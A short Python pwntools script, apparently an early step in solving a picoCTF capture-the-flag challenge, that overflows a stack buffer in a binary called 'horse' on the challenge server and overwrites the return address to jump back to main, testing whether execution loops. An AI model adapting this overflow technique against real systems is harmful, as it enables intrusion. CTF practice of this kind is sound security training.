from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')

payload = b'A' * 32 + b'B' * 8 + p64(elf.symbols['main'])

log.info("Loop 1")
r.sendline(payload)
r.recvuntil(b'/     /   \xc2\xb4\n')

log.info("Loop 2")
r.sendline(payload)
try:
    r.recvuntil(b'/     /   \xc2\xb4\n', timeout=2)
    log.info("Loop 2 Success")
except:
    log.error("Loop 2 Failed")

r.close()
